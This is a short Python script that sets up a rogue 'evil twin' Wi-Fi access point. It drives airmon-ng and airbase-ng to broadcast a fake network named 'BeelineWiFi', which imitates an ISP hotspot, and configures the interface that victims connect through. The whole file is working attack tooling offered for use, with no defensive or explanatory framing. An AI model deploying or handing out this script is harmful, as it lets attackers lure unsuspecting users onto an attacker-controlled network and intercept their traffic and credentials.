#!/usr/bin/env python
# -*- encoding: utf-8 -*-
#
# author: @090h
from subprocess import Popen
from time import sleep

class EvilAccessPoint():
    def __init__(self, ip='192.168.1.1', mask='255.255.255.0', iface='wlan0', essid='BeelineWiFi'):
        self.ip, self.mask, self.iface, self.essid = ip, mask, iface, essid

    def run(self):
        print("Starting AP")
        Popen(['airmon-ng', 'stop', self.iface], stdout=None, stderr=None).wait()
        Popen(['airmon-ng', 'start', self.iface], stdout=None).wait()
        #Popen(['screen', '-d', '-m', '-S', 'ap', 'airbase-ng', '-P', '-C', '30', '-e', self.essid, '-v', 'mon0']).wait()
        Popen(['screen', '-d', '-m', '-S', 'ap', 'airbase-ng', '-e', self.essid, '-v', 'mon0']).wait()
        sleep(3)
        Popen(['ifconfig', 'at0', 'up', self.ip, 'netmask', self.mask],).wait()


if __name__ == '__main__':
    EvilAccessPoint().run()